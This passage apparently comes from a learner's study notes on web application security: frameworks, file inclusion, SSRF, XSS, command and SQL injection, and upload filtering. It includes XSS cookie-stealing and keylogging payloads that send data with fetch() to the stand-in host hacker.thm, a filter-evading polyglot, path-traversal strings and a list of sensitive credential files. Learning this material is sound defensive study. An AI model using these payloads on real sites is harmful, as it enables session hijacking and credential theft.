choice that improves an organizations standards and manages threats. This is the type of protocols used with
critical infrastructure like powerplants and dams. More than 50% of American organizations use NIST standards.
Due to the weak auditing policies of the framework, it is difficult to determine how breaches occur.
National Cyber Security Centre Cyber Assessment Framework (NCSC) (CAF) is the last framework listed,
and is used by UK government agencies. It uses fourteen principals to describe the process from security to
response.
Black-box testing is when you are attacking a target with no information at the start. All information
gathering and enumeration must be done to discover hardward and software used.
Gray-box is when you have limited information while attacking a target.
White-box testing is when you have ALL information, and are scouring for any small vulnerabilities.
Privileged Identity Management (PIM) andd Privileged Access Management (PAM). PIM is when you use a users
credentials and role within an organization to access their role within a system. PAM is the management of the
privileges a systems access role has.
Bell-La Padula model is used for confidentiality purposes, using a hierarchal structure of authority to define user
privileges. This means that in a typical government application, this would mean Secret clearance could view
confidential level clearance, while it would not be able to view top secret level information. Top secret clearance
would grant dominion over all other levels of information and security.
The Biba Model is similar to Bell but focuses on the integrity of the CIA triad, and allows upward privilege
escalation instead of downward. This favors integrity over confidentiality.

STRIDE was created by Microsoft Security Researchers in 1999. It is a framework that describes threat
management and incident response principals.
Spoofing is when a malicious agent falsely identifies itself as another party via user or asset authentication.
API keys and encrypted signatures can help defend against spoofing.
Tampering is countered by anti-tampering measures, keeping data secure and confidential.
Repudiation is the use of services like activity loggers and application trackers. I would assume this
includes spyware, keyloggers, and screen capture technology.
Information Disclosure are applications that handle collective user information to acuurately configure the
data to be relevant for a specific user.
Denial of Service is when physical hardware is intentionally taxed beyond the capacity or strength of the
hardware.
Elevation of Privilege is the worst case scenario. This means that a malicious agent has administrator level
privileges over your data, leading to manipulation, destruction, and distribution of your data.
Incident Response (IR) is a complex system of responses to an attack, which is an entire cybersecurity
career by itself. This is composed of a Computer Security Incident Response Team (CSIRT)

FILE INCLUSION (HUGE STRUGGLES WHAT THE FUCK GOING ON :((((((((( MANNN )
Parameters in the sense of a URL are strings attached to the end of a url that allows for the retrieval of data
or enactment of commands. This is indicated by a ( ? ) after the file name, and is the information added after the
question mark. ‘File’ would be the parameter, while userCV.pdf would be the file accessed.
These are known as input vulnerabilities, and happen when user input, typically via PHP, is not sanitized or
validated. This means that a user can submit any input to the function, which could let them modify the code.
They can also read and leak sensitive data like files, credentials, back-end system access. If a user were to gain
access and manipulate the /tmp directory, they can command remote access and command execution.
Directory Traversal allows a malicious agent to read OS files via manipulation of the applications URL.
Even files outside of the root directory can be accessed externally in this way. In PHP, file_get_contents reads the
contents of a file.
Path Traversal Attacks, otherwise known as dot-dot-slash attacks, uses ‘../’ within the url to attempt to reach
the container directory via the linux command previously described. This command will move one directory per
entry, and can be performed multiple times until the root is reached.
Common Directories:
/etc/issue contains system ID or a message that appears before the login propt.
clu
/etc/profile controls default values for the system. This could include export variables, masks for creating
files, type of terminal, and new message notifications.
/proc/version tells you the kernel version of your linux iteration
/etc/passwd contains all registered users.
/etc/shadow contains password information
/root/.bash_history contains the root users command history
/var/log/dmessage contains global system messages
/root/.ssh/id_rsa contains SSH key for any valid user including root
/var/log/apache2/access.log includes requests for the apache web server
C:\boot.ini contains the boot options for BIOS firmware

Local File Inclusion (LFI) are typically completed against a system with lack of security awareness. These are
common attacks against PHP, ASP, JSP, and Node.js languages. Exploits are similar to path traversal attacks.
When you enter an incorrect file name into the URL, we receive a warning that includes vital information.
Warning: include(languages/THM.php): failed, tells us valuable information – our include function.
The second part of this error message has more vital info – No such file or directory in
/var/www/html/THM-4/index.php on line 12. /var/www/html/THM-4/ tells us the full web app directory path,
which can be used in conjunction with ‘ ../ ‘ to exploit this. This will get us out of this folder and into the
containing folder. In this case we used four ‘ ../ ‘ because we know that the directory pathing has four levels - ‘
/var/www/html/THM-4 ‘. However, this still yields an error. This happens because the developer has modified the
include function to append .php to the end as they have predefined the acceptable type of file for use with this
function.
Null Bytes, such as 00% and 0x00, can be implemented in this case to terminate strings that occur after the null
byte. Prior to PHP 5.3.4, this was a valid method of attack, but this has been eliminated and no longer works with
modern php.
Filters can be applied to remove specific terms from being entered with the URL. These are assigned by the
developers and can prevent a user from entering something like /etc/passwd/ into the URL. If a filter is used to
identify ‘ ../ ‘ and replace it with an empty string, there are still methods we can employ to bypass it.
We would use ‘ ....//....//....//....//....//etc/passwd, because the filter removes a ../ from each segment,
which oddly works to leave the remaining ../ within the segment, thusly still allowing for use to move back one
directory even after the filter has been applied.
Remote File Inclusion (RFI) is a method of including remote files and injecting them into a vulnerable application.
This typically occurs with systems using poor or no sanitation methods. This allows for injections of external URL
into the ‘include’ function. **allow_url_fopen MUST be toggled on for this to work ** RFI is more of a risk than
LFI because it allows a user to gain Remote Command Execution (RCE) on a server or device. This could lead to
leaking of sensitive data, Cross-site Scripting (XSS) or Denial of Service (DOS) attacks.
In order for an RFI attack to be successful, an external server must communicate with an application server
in order for an attacker to host malicious files on the application server. Malicious files are injected via HTTP
requests, then this is executed on the app server.
When you surpass input validation, the web app sends a GET request to the attacking server and fetches a
file. This remote file is passed to the include function where it will execute the PHP file within the page and return
the subsequent data to the attacker.
RFI attacks can be prevented by implementing different methods such as:
1. Keeping your OS, hardware, and software updated.
2. Disable PHP errors.
3. Using a Web Application Firewall (WAF).
4. Disable PHP features such as allow_url_fopen and allow_url_include.
5. Only allow protocols and PHP .
6. DO NOT trust user input, use proper validation techniques.
7. Whitelist file names and locations, and blacklist what is appropriate.

SSRF
Server-Side Request Forgery (SSRF) is when an attacker forces a webserver to make additional or
manipulated HTTP requests. There are two types: one where the data is displayed directly on the attackers
hardware, and the second is Blind-SSRF where no information is visible to the attacker. These types of attacks can
be used to access unauthorized areas, obtain customer and organization data, scaling to internal networks, and
revealing credentials and authentication tokens.

SSRF vulnerabilities can be uncovered by several key identifiers, such as:
A full URL is found within the URL you are actively using.
This is usually hidden though, which can be detected within a hidden field in a form.
Partial URLs in the main URL, which may just be a hostname like ‘ =api ‘.
The path of the URL, which might look something like =/data/users
During blind SSRF attacks, you can use an external HTTP logging tool to monitor requests, like
requestbin.com, your own server, or Collaborator within Burp Suite.
A developer might implement Deny and Allow lists, which are black/whitelisting methods that can
block/allow specific IPs, specific endpoints, and denial of access to localhost. If using cloud-technology, you
would block 169.254.169.254 which contains the metadata for the cloud server. This can be bypassed by using a
subdomain on their own server, which redirects DNS to the IP 169.254.169.254. Deny lists can recognize specific
patterns and block requests based on these malicious identifiers.

XSS
Cross-Site Scripting is an injection attack based in JavaScript with the intention of the injection to be
executable by other users.
An XSS Payload is the JavaScript we intend on executing on the target. This consists of two parts, the
intention and the modification. Payload Intentions is what you want the JavaScript to do, and the Payload
Modification is the changes that need to be made to the target code to achieve execution on the target.
Proof of Concept is a simple payload, similar to Hello World programs for beginners. This line of code will
let you achieve XSS on a website via a pop-up window with a string of text.
<script>alert(‘XSS’);</script>
Session Stealing is typically the exploitation of cookies to retrieve login tokens. The supplied XSS
injection takes a target cookie, encodes it into base64 to ensure successful transmission and posts it to a site
controlled by the attacker. From this point the attacker can take control of the target machine and log in as a user.
<script>fetch(‘https://hacker.thm/steal?cookie=’ + btoa(document.cookie));</script>

Key Loggers collect data about what is typed on a webpage, forwarding this info to a website that the
attacker controls. This collects every keystroke, easily revealing log-in credentials for unaware users.
<script>document.onkeypress = function(e) { fetch(‘https://hacker.thm/log?key=’ + btoa(e.key) );}</script>
Business Logic is a more specific payload that exploits a particular network resource or JS function.
Reflected XSS is when there is user input included in the webpage source without being validated. An
example of this attack is getting a user to click on a link to a malicious site that can collect their data and return it to
the attacker.
Stored XSS is when the malicious code is stored in a database. The example given would be if a website
database used to store user comments does not validate the posted comments. This means that a user could submit
a comment containing malicious javascript, which will be saved to the server and possibly spread to other users.
Document Object Model (DOM) Based XSS is when the JavaScript executable code happens within a
browser without loading new pages or new data submissions. Execution occurs upon user interaction or input. This
type of attack is difficult to detect unless you have deeper understanding of JavaScript as a whole.
Blind XSS is most similar to Stored XSS, except you are unable to test the payload against yourself and you
are unable to see it actively working. This type of attack can reveal employee portals, cookies, and even portal page
contents. You must ensure your payload has a callback to know if it is working, typically in the fform of an HTTP
request. XSShunter is a popular tool for these types of attacks.

A key thing to note about these injections is that you are troubleshooting how to bypass the javascript by
using the pagesource to analyze your input. When you see how the page receives data, you can figure out how to
end the JS statement using appropriate JS mechanisms like commenting, semi-colon, quotes, and inequality signs.
There may also be filters inplemented that block out specific hazard words like, ‘script’ which are commongly used
in XSS attacks. Writing your code in the format of sscriptcript will let the filter remove script where it cannot see
the second ‘script’ lying in wait.
A Polyglot is a text string that escapes tags, bypass filters, and attributes as a single script. The example
polyglot given for this exercise is below:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM')
)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

COMMAND INJECTION
Command injection is when you use the default behaviors of an application to gain control of the OS using
basic user privileges. This is also known as Remote Code Execution (RCE), where an attacker can execute
malicious code on an OS without having direct access. Commonly exploited languages include PHP, JavaScript,
and NodeJS.
Blind command injection executes malicious code on a target without yielding feedback or data that is
visible to the attacker. These types of injections use commands like ping and sleep to cause a time delay. Using
redirection operators (>) in conjunction with whoami commands can store the output, which can then be read by the
attacker who cats the files on their own machine. Curl is a useful tool to test for successful command injections.
Verbose command injection is when the attacker is able to see data output from the target system. This
technique is typically easier and provides more information than blind injections.
Methods for prevention include filtering input queries and minimally using vulnerable functions and libraries. In
some cases this may mean limiting input to only numerals or removing hazardous words from submissions. Input
Sanitisation can be implemented as well, filtering out special characters like >, &, and / which are used in these type
of attacks.
These methods can be bypassed through certain strategies, such as implementing the hex-code for a
quotation mark instead of submitting the typed character - “ “ -

SQL INJECTIONS
SQL injections (SQLi) are attacks on webapp databases that executes malicious queries, typically due to
submissions that have not been properly validated.
Databases are collections of stored digital data that is organized by a Database Management System
(DBMS). There are relational and non-relational DBMS’, but we are concentrating on relational databases that
utilize MySQL, Microsoft SQL Server, Access, PostgreSQL, and SQLite. A DBMS may interact with multiple
databases that each contain their own unique set of relational data. Data is held within tables, which each have a
unique name identifier. A table is a grid comprised of rows and columns, where columns hold data related to a
specific category or data type – so a column labeled ‘Prices’ would probable only accept numerical values and
throw errors if a string ‘hello’ is submitted to the column. Tables usually have a column that contains a unique ID,
known as primary keys, which are used by other databases to reference the data, thusly named relational databases.
Non-relational databases, aka NoSQL, do not have to use tables, columns, or rows, and can be constructed
with more flexibility. Common types of this include MongoDB, Cassandra, and ElasticSearch.
Structured Query Language (SQL) is a method of organizing data via built-in features known as SQL Queries or
Statements. SQL is NOT case-sensitive.
SELECT is a statement used to retrieve information from the database.

UNION combines two SELECT statements to retrieve data from one or more tables. The statement must
retrieve the same number of columns in each SELECT statement AND the columns must be of a similar data type.
The data must share characteristics and amount of columns so they can be accurately appended to the same table.
INSERT places a new row of data within the table. INSERT ‘into users’ would add a row to the users
column.
DELETE works similarly to SELECT, while removing content instead of retrieval. If this is not used in
conjunction with a WHERE clause, all data will be deleted from the table. This is because the command does not
designate where to start deleting, so everything is included in the delete. The LIMIT clause would denote the
number of rows to be deleted.
In-Band SQL Injection is when you use the same communication method to both perform the exploitation
and receive the results. This type of vulnerability is the easiest to identify and exploit.
Error-Based SQL Injections print information from the databases as error messages and is one of the easiest
way to obtain information. You can enumerate an entire database using this method. Error-Based injection can
often be detected by entering special characters into the query window.
Union-based SQL Injection is when UNION is used in conjunction with SELECT to return additional
results. You can retrieve large amounts of data via this vulnerabilitiy.
Authentication Bypass is an easier method of Blind SQL Injection that can be used to bypass login forms.
These forms are connected to a database of users, and the webapp takes user input and compares it with values in
the database until it discovers a match. The login form supplies a query and the database responds with a yes or no
in regards to a matching set of data from the users table.
Boolean based SQL Injection indicates responses from the SQL database that return a y/n or 1/0 or T/F
response – otherwise stated as a response that can only have two outcomes. This binary outcome indicates whether
our injection was successful or not. The example given shows that we can submit a username to determine if it has
already been registered to the domain or not. Enter the name ‘admin’ and if {“taken”: true} is the response, this is
already a registered user account.
Time-Based Blind SQLi is similar to boolean, except that instead of returning a visual response of T/F, we
use timers or delays to indicate that something is happening in the background. Perhaps a 3 second delay indicates
true where we would not be able to retrieve a boolean response from the server. The SLEEP() method in
conjunction with UNION and SELECT statements can achieve this.
Out-Of-Band SQLi is uncommon compared to other methods because it is dependent on specific database
features being enabled. It uses two different methods of communication, one for executing the attack and another
for collecting results.
Prevention methods include:
Prepared Statements (with Parameterized Queries) ensure that the SQL structure remains intact, allowing
the DB to differentiate between requests and data. The SQL query is submitted with user inputs included as
parameters. I don’t fully understand what this means but okay lol.
Input Validation implements an ‘allow list’ that restricts submissions to only include specific strings, while
excluding ones that are often exploited.
Escaping User Input simply means using the ( \ ) character to escape certain terms, rendering them as a
string instead of executable code.

UPLOAD VULNERABILITIES
Filtering is used as a basic defense against web attacks, where certain terms and characters are excluded
from acceptable input. Client-side filters usually deal with Javascript, while server-side filters typically deal with

php. While client-side filtering is easily bypassed since it is happening within your own machine, server-side
filtering must be bypassed via clever implementation of payloads that will not be caught in the server-side filters.
Types of Filters:
Extension Validation is when windows file extension names are filtered before being accepted as input.
These extensions are accepted via whitelisting and blacklisting.
File Type Filtering is a more intense version of Extension Validation. It looks at the type of file being
submitted, and then uses either MIME validation or Magic Number validation.
Multipurpose Internet Mail Extension (MIME) validation types are used as an identifier for files when they
are initially transferred as email attachments or via HTTPS. The MIME type is described in the Header of the
HTTP request as Content-Type: <type>/<subtype>. These can be checked on client-side or server-side.
Magic Number validation is the default method of validation for Unix, and is the more accurate way to
determine file contents. A string of number pairs is used to identify file-type, and while somewhat secure, this can
still easily be falsified.
File Length Filtering limits the size or length of the file to be uploaded. The prevents massive files from
being uploaded, which consumes server resources. Most payloads for php are relatively small, however there may
be a limit so small that we cannot submit even small payloads.
File Name Filtering can screen for duplicate file names and specific characters that are often used in
attacks. Some systems may even generate a filename for you, so that you cannot perform exploits based on your
own unique file name.
File Content Filtering examines the whole submitted file contents, checking for multiple other forms of
validation. This filter may check for MIME, Magic Number, File Length, and file name combined. This is the
most complex and rigorous form of validation.
Client-side Filtering is the easiest to bypass by far, since you are the one in control of the machine. There
are four common methods for achieving this:
Turn off JavaScript – this is a simple method that can be performed via browser, but may not work if
JavaScript is required for basic site functionality.
Intercept requests via apps like Burpsuite – you catch the request via proxy and modify the request using
the features in Burp. You may intercept the url request, or a file upload request. Intercepting the file upload occurs
before the page is loaded.
Sending a file via upload point – this can be done in terminal with an app like curl.